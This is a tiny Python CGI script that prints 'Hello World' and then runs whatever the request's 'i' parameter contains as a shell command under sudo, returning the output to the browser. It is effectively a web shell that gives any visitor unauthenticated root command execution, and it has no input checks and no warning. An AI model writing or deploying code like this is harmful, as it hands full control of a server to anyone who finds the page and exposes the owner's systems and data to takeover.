#!/usr/bin/python3
print("Content-type: text/html")
print()
print("Hello World")

import subprocess
import cgi
i=cgi.FieldStorage()
x=i.getvalue("i")
o=subprocess.getoutput("sudo "+x)
print(o)

